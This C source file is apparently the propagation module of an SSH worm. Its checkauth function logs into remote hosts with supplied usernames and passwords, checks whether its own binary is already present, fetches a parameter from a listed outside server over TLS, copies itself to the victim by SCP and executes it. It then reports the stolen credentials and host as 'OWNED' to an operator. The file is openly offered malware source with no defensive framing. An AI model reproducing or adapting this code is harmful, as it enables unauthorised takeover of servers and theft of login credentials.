#include <libssh/libssh.h>

#define DESTDIR "."

void checkauth(char *user, char *password,char *host)
{


	char cwd[PATH_MAX];
	getcwd(cwd, sizeof(cwd));
	char command[300];
	char data[1024];

	char exe[1024];
	int ret;

	ret = readlink("/proc/self/exe",exe,sizeof(exe)-1);

	exe[ret] = 0;

	time_t my_time;
	time(&my_time);
	struct tm * time_real; 
	time_real = localtime (&my_time);
	int port = 22;
	ssh_session br_ssh_session = ssh_new();
	ssh_channel check;

	char buffercheck[1024];
	unsigned int nbytes;
	alarm(10);

	ssh_options_set(br_ssh_session, SSH_OPTIONS_USER, user);
	ssh_options_set(br_ssh_session, SSH_OPTIONS_HOST, host);
	ssh_options_set(br_ssh_session, SSH_OPTIONS_PORT, &port);

	int rc = ssh_connect(br_ssh_session);

	if (rc == SSH_ERROR) {
		ssh_disconnect(br_ssh_session);
		ssh_free(br_ssh_session);
	}

	int state = ssh_userauth_autopubkey(br_ssh_session, NULL);

	int upa = ssh_userauth_password(br_ssh_session, user, password);

	if (upa != SSH_AUTH_SUCCESS ){
		ssh_disconnect(br_ssh_session);
		ssh_free(br_ssh_session);
	}else{

		char chckstr[1024] = {0};
		sprintf(chckstr, "ls %s;",fNAME);


		check = ssh_channel_new(br_ssh_session);
		rc = ssh_channel_open_session(check);
		rc = ssh_channel_request_exec(check, chckstr);

		nbytes = ssh_channel_read(check, buffercheck, sizeof(buffercheck), 0);
		while (nbytes > 0) {
			// fwrite(buffercheck, 1, nbytes, stdout);
			nbytes = ssh_channel_read(check, buffercheck, sizeof(buffercheck), 0);
		}


		char *word = ("%s",fNAME);

		char *pch = strstr(buffercheck, word);

		if(pch)
		{
			exit(0); 
		}else{

			char buff[200], data[] = "\r\n\r\n\r\n";
			int len = strlen(data);
			int sck;
			struct sockaddr_in remote;
			struct hostent *he;
			he = gethostbyname(host);

			remote.sin_family = AF_INET;
			remote.sin_port = htons(22);
			memcpy(&remote.sin_addr, he->h_addr, he->h_length);
			sck = socket(AF_INET, SOCK_STREAM, 0);

			connect(sck,(struct sockaddr *)&remote, sizeof(struct sockaddr));

			send(sock, data, len, 0);
			read(sck,buff, sizeof(buff));

			/////////////////////////////////////////////////////////////////////
			/////////////////////////SPREAD//////////////////////////////////////
			////////////////////////////////////////////////////////////////////

			////LOCIP
			//
			//  Initialize the variables
			//

			BIO* bio;
			SSL* ssl;
			SSL_CTX* ctx;
zurr:
			//
			//   Registers the SSL/TLS ciphers and digests.
			//
			//   Basically start the security layer.
			//
			SSL_library_init();

			//
			//  Creates a new SSL_CTX object as a framework to establish TLS/SSL
			//  or DTLS enabled connections
			//
			ctx = SSL_CTX_new(SSLv23_client_method());

			//
			//  -> Error check
			//
			if (ctx == NULL)
			{
				goto zurr;
			}

			//
			//   Creates a new BIO chain consisting of an SSL BIO
			//
			bio = BIO_new_ssl_connect(ctx);

			//
			//  Use the variable from the beginning of the file to create a 
			//  string that contains the URL to the site that you want to connect
			//  to while also specifying the port.
			//

			char *ipchecker;
			ipchecker =xlist[getip()];

			BIO_set_conn_hostname(bio, ipchecker);

			//
			//   Attempts to connect the supplied BIO
			//
			if(BIO_do_connect(bio) <= 0)
			{
				goto zurr;
			}
			else
			{

			}

			//
			//  The bare minimum to make a HTTP request.
			//



			char *bla;
			asprintf(&bla, "POST / HTTP/1.0\r\nHost: %s\r\n\r\n",ipchecker);
			// do something with bla
			const char *mystr = bla;


			//
			//   Attempts to write len bytes from buf to BIO
			//
			if(BIO_write(bio, mystr, strlen(mystr)) <= 0)
			{
				//
				//  Handle failed writes here
				//
				if(!BIO_should_retry(bio))
				{
					// Not worth implementing, but worth knowing.
				}

				//
				//  -> Let us know about the failed writes
				//
				goto zurr;
			}

			//
			//  Variables used to read the response from the server
			//
			int size;
			char buf[1024];

			//
			//  Read the response message
			//
			for(;;)
			{
				//
				//  Get chunks of the response 1023 at the time.
				//
				size = BIO_read(bio, buf, 1023);

				//
				//  If no more data, then exit the loop
				//
				if(size <= 0)
				{
					break;
				}

				//
				//  Terminate the string with a 0, to let know C when the string 
				//  ends.
				//
				buf[size] = 0;

				//
				//  ->  Print out the response
				//
				char *buffi = buf; // Get HTTP response from URL
				char *content = strstr(buf, "\r\n\r\n");

				const char *target = content;
				char bufz[256];
				sscanf(target, "%s", bufz); // Trimming on both sides occurs here


				//
				//  Clean after ourselves
				//
				BIO_free_all(bio);
				SSL_CTX_free(ctx);

				//////////
				char filename[1024] = {0};
				sprintf(filename, "%s" , fNAME);
				char exec[1024] = {0};

				sprintf(exec, "chmod a+x %s;./%s %s;" ,fNAME, fNAME, bufz);

				const char *loclfile=filename;
				const char *scppath=DESTDIR;
				FILE *f;
				int rc;
				char *buffer;
				size_t count;
				char *ptr;
				long lSize;
				size_t result;
				int scpinit;
				int position = 0;
				ssh_scp scp;
				scp=ssh_scp_new(br_ssh_session, SSH_SCP_WRITE | SSH_SCP_RECURSIVE ,DESTDIR );
				scpinit=ssh_scp_init(scp);
				f = fopen(loclfile, "rb");


				fseek (f , 0 , SEEK_END);
				lSize = ftell (f);
				rewind (f);

				buffer = (char*) malloc (sizeof(char)*lSize);
				result = fread (buffer,1,lSize,f);
				//position = result;
				ssh_scp_push_file(scp, loclfile ,result, S_IRUSR | S_IWUSR);
				buffer += position;
				result -= position;
				alarm(60);
				if (ssh_scp_write(scp,buffer, result) != SSH_OK);
				////////////////////////////////
				////////////////////////////////
				//??channel???????
				//..channel.......
				ssh_channel channel;
				channel = ssh_channel_new(br_ssh_session);
				if (channel == NULL){
					return SSH_ERROR;
				}
				rc = ssh_channel_open_session(channel);
				if (rc != SSH_OK)
				{
					ssh_channel_free(channel);
					return rc;
				}
				//spread
				int spread;
				spread = ssh_channel_request_exec(channel,exec);
				clock_t tic = clock();
				time_real = localtime(&my_time);
				AdmSend("%s\nOWNED:[ %s / %s ]IP:[ %s ] - %s",asctime(time_real),user,password,host,buff); sleep(1);
				close(sck);

				exit(0);

			}}
	}
}

